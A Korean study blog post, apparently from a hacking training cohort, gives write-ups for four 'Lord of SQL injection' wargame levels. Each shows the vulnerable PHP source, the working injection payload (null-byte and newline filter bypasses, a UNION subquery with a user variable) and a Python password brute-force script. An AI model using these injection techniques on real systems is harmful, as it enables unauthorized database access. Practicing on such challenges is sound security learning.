---
layout: default
title: Day56
nav_order: 5

parent: Hacking Project - W8
grand_parent: P4C
---

##### 해당 게시글은 빡공팟 4기(with TeamH4C)와 관련되어 있습니다

-----

# > Lord of Sql injection: zombie_assassin

## 삽질

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect();
  $_GET['id'] = strrev(addslashes($_GET['id']));
  $_GET['pw'] = strrev(addslashes($_GET['pw']));
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

시작부터 `strrev` 라는 낯선 함수가 튀어나왔다. 찾아보니 문자열을 입력받아 순서를 뒤집은 상태로 리턴하는 함수라고 한다.

![image-20220612130916828](../img/image-20220612130916828.png)

id=123을 전송하였으나 321로 받는 모습이 보인다!

그런데 여기에 `addslashese` 함수가 추가되면서 특정 기호를 삽입하면 이스케이프 문자 `\\` 함께 붙어져서 나온다. 또한 포함되어있는 이 문자열 자체들도 `strrev()`에 의해 거꾸로 배열이 되면서 이스케이프 문자가 이상하게 이동된다.


<br>

## writeup

```
id=\
```

![image-20220612154727679](../img/image-20220612154727679.png)

WHERE 의 id 조건 부분에서 `'`  기호를 이스케이프 문자를 입히면서 문자로 인식되게 할려 했으나 이스케이프 삽입 시 2개가 삽입되는 것을 볼 수 있다. 이스케이프 문자 `\\` 를 하나만 입력하기 위해서 아래처럼 시도했다.


```
id=%00
```

![image-20220612154952504](../img/image-20220612154952504.png)

이렇게 하면서 빨간줄 부분이 문자로 처리되고 이 뒤에 항상 참을 만드는 쿼리문을 완성하면 되겠다.

<br>

```
id=%00&pw=+--1 ro
```

![image-20220612155123226](../img/image-20220612155123226.png)

`strrev` 덕분에 좀 더 머리를 써야했다.

<br><br><br>

-----

# > Lord of Sql injection: nightmare

## 삽질

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

`pw` 파라미터의 값이 6자리보다 크면 안된다고 한다. 게다가 pw 파라미터 뒤에 딸려오는 `id!='admin'` 부분을 주석처리 하고 싶지만 `preg_match`에서 `-`와 `#` 기호 등등을 막아버렸다. 비밀번호의 길이도 모르는데 비밀번호를 게싱할 수도 없는 노릇이다.

<br><br>

이 문제를 어떻게든 스스로 풀고 싶었지만 떠오르는 아이디어가 없었고 힌트를 확인했더니 `pw=0=0` 이 참이라는 힌트를 얻었다. 그리하여 배우게 된 개념은 sql의 **자동형변환**이라는 기능인데 문자와 정수가 비교될 경우에 형 변환이 이루어진 다음 비교가 진행되는 것이다.

가령 위 예시를 직접 내 DB를 이용해 확인해보자.

![image-20220612163028849](../img/image-20220612163028849.png)

`userpw=1=1` 이라는 조건에서는 어떠한 결과도 출력되지 않지만, `userpw=0=0`은 계정 정보가 출력되는 것을 볼 수 있다. 또한 `SELECT` 구문 결과에서 12 warning이라는 오류를 확인할 수 있는데 해당 정보도 확인해보면 다음과 같다.

![image-20220612163327118](../img/image-20220612163327118.png)

조건절의 비교구문에서 타입이 일치하지 않아서 발생했다는 의미이다. 하지만 그럼에도 결과를 출력하지 않은 것이 아니라 "자동형변환"이 이루어져 비교가 진행되었고 타입이 변경된 상태에서 비교가 진행된 것이다.

그리고 어떠한 값으로 변환되었는지 가늠해보기 위해 테스트를 진행해보았다.

![image-20220612163603616](../img/image-20220612163603616.png)

제일 왼쪽부터 컬럼명, 숫자0, 문자열 순으로 삽입하였는데 쿼리 결과가 출력되었다. 이 점을 미루어보아 컬럼명과 삽입한 문자열이 정수 타입으로 변경이 되었고 전부 0으로 변환되었기에 "참"이 성립된 것으로 보인다.

![image-20220612164003984](../img/image-20220612164003984.png)

최종적으로 위 시도를 통해서 문자열에 포함되어 숫자가 정수로 변환되면서 참이 된다.

<br>


## writeup

주석처리를 위한 방법을 `--#` 또는 `#` 정도로만 알고 있었는데 `;%00`도 뒷 부분을 넘길 수 있다고 한다. 생각해보면 sql 쿼리를 넘길 때 c언어 코드 작성처럼 `;`를 마지막에 붙혀줘야 했던 기억이 있다.

그리고 자동형변환을 이용하여 쿼리 문의 결과가 출력되도록 만들면 되겠다.

```
pw=')=0;%00
```

![image-20220612161642312](../img/image-20220612161642312.png)


가장 푸는데 오래걸리고 결국 힌트를 보고나서야 풀었던 문제이다. 하지만 덕분에 더 많은 것을 배울 수 있었다.

<br><br><br>

-----


# > Lord of Sql injection: xavis

## 삽질


```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/regex|like/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_xavis where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("xavis"); 
  highlight_file(__FILE__); 
?>
```

앞선 문제들 중에서 `LIKE` 절을 이용한 풀이가 막힌 상태이다. 그러나 오히려 `left()`, `substr()`  등등이 사용가능 하다.

하지만 역시나

```python
import requests
cookie = {'PHPSESSID':'li50f951judq090e205e9dcs4h'}

def my_request(upw):
	url = f'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php?pw={upw}'
	print(url)
	response = requests.get(url=url,cookies=cookie)
	return response

def find_pw():
	res = ""
	for c in range(1,10):
		for i in range(0,127):
			upw = f'\' or left(pw,{c})="{res}'+chr(i)+'" --+'
			response = my_request(upw)
			if "Hello admin" in response.text:
				print("I got: ",chr(i))
				res += chr(i)
				break

	print("I think it was completed")

def solve():
	find_pw()

if __name__ == "__main__":
	solve()	

```

이전에 풀었던 문제들처럼 브루트 포싱을 시도했음에도 전혀 결과가 나오질 않았고 쿼리가 잘못되었는지 수없이 확인했지만 값을 얻을 수 없었다. 

놓친 것이 있는지 코드를 다시 읽다보면 서브 쿼리를 사용이 가능할 것 같다는 생각이 들었다. 배워뒀었지만 그간 필터링에 의해 사용하지 못했던 것을 이용해보기로 했다. 그 중에서 가장 눈에 밟히는 것은 쿼리문을 합치는 `UNION` 연산자인데, 이를 이용하면 앞선 쿼리 결과와 함께 연관되어 결과 출력이 가능하다. 따라서 `A UNION B` 와 같은 쿼리에서 A로 부터 admin의 pw를 얻고 B에서 해당 결과를 출력시키도록 해야겠다.

### 서브쿼리
sqld 자격증 공부 당시 익혀둔 개념으로 `SELECT`와 같은 구문의 `WHERE` 또는 `FROM` 절에서  괄호 `()`를 이용하여 쿼리 안에 쿼리를 넣음으로써 다양한 결과를 얻어낼 수 있다.

예로 다음과 같다.

![image-20220612181453756](../img/image-20220612181453756.png)

서브 쿼리는 `SELECT` 구문에서 사용할 때, `FROM` 절에서 사용될 때, `WHERE` 절에서 사용될 때 등 사용되는 위치에 따라 결과값이 반드시 하나여야 한다는 등의 조건이 존재한다. 하지만 이번 문제에서 사용하려는 서브쿼리의 위치는 `WHERE` 절이기에 서브쿼리의 결과 칼럼이 1개이도록만 만들면 되겠다.

![image-20220612181923235](../img/image-20220612181923235.png)

만약 서브쿼리의 결과가 2개 이상일 경우에는 올바르지 않기 때문이다.  
-> 반드시 그래야 하는지 찾아보았는데 다중행 서브쿼리 사용 시에는 `IN,ANY,ALL` 과 같은 연산자를 사용해야 한다고 한다.


<br>


### 지역 변수 '@'

어떠한 언어를 배우고, 스크립트를 짜다보면 얻어내는 결과를 변수와 같은 곳에 저장을 해두어서 가변적으로 사용할 순 없을까 라는 생각을 자주 했다. 그래서 SQL 구문에서는 사용할 수 있는지 찾아보았고 `@` 기호를 이용하여 지역 변수를 나타낼 수 있다는 정보를 얻었다.

사용법은 다음과 같았다.

![image-20220612182631457](../img/image-20220612182631457.png)

`SET` 구문을 이용하여 변수에 값을 넣을 때에는 `SET @a=1` 처럼 사용하면 되고, `SELECT` 문에서 변수에 값을 넣을 경우에는 `=`가 비교연산자로 인식되기 때문에 `:=` 를 이용해서 변수에 값을 넣어야 한다.


<br>

## writeup

`UNION`과 **SQL의 지역변수** 개념을 이용하여 쿼리문을 작성하였다.

```
' or (select @p:=pw WHERE id ='admin') UNION SELECT @p--+
```

![image-20220612180151782](../img/image-20220612180151782.png)

이 결과를 통해서 왜 이전 문제들처럼 브루트포싱이 불가능했는지 알 수 있었고, 아스키코드 127번으로 모든 것을 표현할 수 있다고 착각했던게 문제임을 알았다. 하지만 서브쿼리와 `UNION` 연산이 사용 가능해짐으로써 더 편하게 비밀번호를 얻어낼 수 있었다.

또한 신기하게도 서브 쿼리에서는 `FROM` 절을 사용하지 않아도 메인 쿼리의 테이블로부터 결과값을 가져올 수 있었다.{: .text-red-000}

![image-20220612183419171](../img/image-20220612183419171.png)

<br><br><br>

-----

# > Lord of Sql injection: dragon

## 삽질

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("dragon");
  highlight_file(__FILE__); 
?>
```

![image-20220612184621862](../img/image-20220612184621862.png)

이왕 켠김에 드래곤은 잡아야하지 않겠냐는 생각에 열어보았는데 많이 많이 당황했다. 아니 사용자의 입력이 주석처리되면 어쩌자는거지?

![image-20220612184335384](../img/image-20220612184335384.png)

직접 DB 쿼리를 날릴 때에 줄바꿈이 이루어지면 어떻게 되려나 싶은 마음에

```
pw=%0a
```
를 날렸더니 위 사진과 같은 결과가 나왔다. 항상 `GUEST`가 나올 줄 알았는데 이러면 도전해볼만하지 않은가?!

<br>

## writeup

`#`과 `--+`과 같은 주석처리는 결국 기호 뒤에 있는 줄의 문자들만 가능하다. 즉, 같은 줄에만 있는 문자들만 되는 것이다. 그리하여 다음 줄에 이어지는 쿼리문을 작성한다면 의도대로 id 파라미터 값을 'admin' 으로 만들 수 있겠다.

```
%0a and 0 or id='admin
```

앞선 `id='guest'` 부분을 `and 0`을 붙혀주면서 거짓으로 만들고 뒤에 `or id='admin'`을 완성시켜 풀었다.

![image-20220612185010767](../img/image-20220612185010767.png)

앞선 문제보다 훨씬 쉽게 느껴졌고 아마도 이전 DB 구축 시 직접 명령어를 쳐본 경험이 도움이 됬다.

